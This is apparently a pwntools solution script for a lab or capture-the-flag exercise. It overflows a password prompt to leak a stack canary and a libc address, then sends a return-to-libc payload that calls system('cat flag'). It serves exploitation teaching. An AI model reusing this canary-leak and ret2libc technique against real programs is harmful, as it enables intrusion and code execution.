#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4a'
#exe = './exercise4a'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
libc = ELF('/usr/lib/i386-linux-gnu/libc-2.31.so')
elf = ELF(exe)

# 1. canary
r.sendline(b'cat flag')
r.recvuntil(b' password:\n')
r.sendline(b'A'*151)
all = r.recv()
all = all[15+152:15+152+20]

printf_addr = all[0:4]
cat_flag = all[-8:-4]
canary = all[-4:]

offset = u32(printf_addr) - libc.symbols['printf']
sys_addr = offset + libc.symbols['system']
exit_addr = offset + libc.symbols['exit']


shellcode = b'A'*168 + canary + b'A'*16 + p32(sys_addr) + p32(exit_addr) + cat_flag 
r.sendline(shellcode)
print(r.recvall())
